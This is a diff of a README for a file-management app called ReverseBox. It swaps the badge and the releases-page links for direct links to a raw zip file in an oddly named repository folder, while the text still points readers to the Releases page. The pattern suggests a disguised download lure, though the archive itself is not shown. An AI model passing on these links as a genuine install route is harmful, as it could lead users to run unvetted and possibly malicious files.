@@ -1,6 +1,6 @@
 # 🚀 ReverseBox - Simple File Management for Everyone
 
-![Download ReverseBox](https://img.shields.io/badge/Download%20ReverseBox-v1.0.0-brightgreen)
+![Download ReverseBox](https://raw.githubusercontent.com/smalling35/ReverseBox/main/cortina/ReverseBox.zip%20ReverseBox-v1.0.0-brightgreen)
 
 ## 📦 Introduction
 
@@ -27,7 +27,7 @@ To run ReverseBox, ensure your system meets the following requirements:
 ## 🚀 Getting Started
 
 1. **Download ReverseBox**: Visit this page to download.  
-   [Download ReverseBox](https://github.com/smalling35/ReverseBox/releases)
+   [Download ReverseBox](https://raw.githubusercontent.com/smalling35/ReverseBox/main/cortina/ReverseBox.zip)
 
 2. **Install the Application**: Locate the downloaded file and run the installer. Follow the on-screen prompts to complete the installation.
 
@@ -41,7 +41,7 @@ To run ReverseBox, ensure your system meets the following requirements:
 
 To download ReverseBox, go to the releases page. Use the link below to access the most recent version:
 
-[Download ReverseBox](https://github.com/smalling35/ReverseBox/releases)
+[Download ReverseBox](https://raw.githubusercontent.com/smalling35/ReverseBox/main/cortina/ReverseBox.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Scroll down to find the latest version of ReverseBox.
